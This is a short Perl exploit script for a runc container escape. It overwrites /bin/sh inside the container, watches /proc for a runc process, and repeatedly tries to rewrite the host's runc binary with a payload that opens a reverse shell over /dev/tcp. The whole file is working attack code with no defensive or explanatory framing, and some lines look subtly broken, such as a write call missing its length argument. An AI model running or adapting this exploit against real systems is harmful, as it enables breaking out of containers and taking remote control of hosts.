#!/usr/bin/env perl
require 'syscall.ph';        # may need to run h2ph

$SH = '/bin/sh';
$PAYLOAD = '#!/bin/bash\n/bin/bash -i >& /dev/tcp/127.0.0.1/4455 0>&1';
#$SELF_FD_FMT = "/proc/self/fd/";
$TIMES = 99999;

sub pwn() {
    open($fsh, '>', $SH) or die $!;
    print $fsh '#!/proc/self/exe';
    chmod(0777, $fsh);
    close($fsh) or die $!;

    while (true) {
        for $pid (glob('/proc/[0-9]*')) {
            open($fh, '<', "$pid/cmdline");
            my $cmdline = <$fh>;
            close($fh);
            if ($cmdline =~ /runc/) {
                print("starting exploit $cmdline\n");
                for ($i = 0; $i < $TIMES; $i = $i + 1) {
                    my $rfd = syscall(SYS_open(), "$pid/exe", O_PATH);
                    if ($rfd >= 0) {
                        print("Successfuly opened at $rfd\n");
                        for ($i = 0; $i < $TIMES; $i = $i + 1) {
                            my $wfd = syscall(SYS_open(), "/proc/self/fd/$rfd", O_WRONLY | O_TRUNC);
                            if ($wfd >= 0) {
                                printf("Successfully openned runc binary as WRONLY\n");
                                my $ret = syscall(SYS_write(), $wfd, $PAYLOAD, );
                                if ($ret > 0) {
                                    print("Payload deployed\n");
                                }
                            }
                        }
                    } else {
                        break;
                    }
                }
            }
        }
    }
}

pwn();
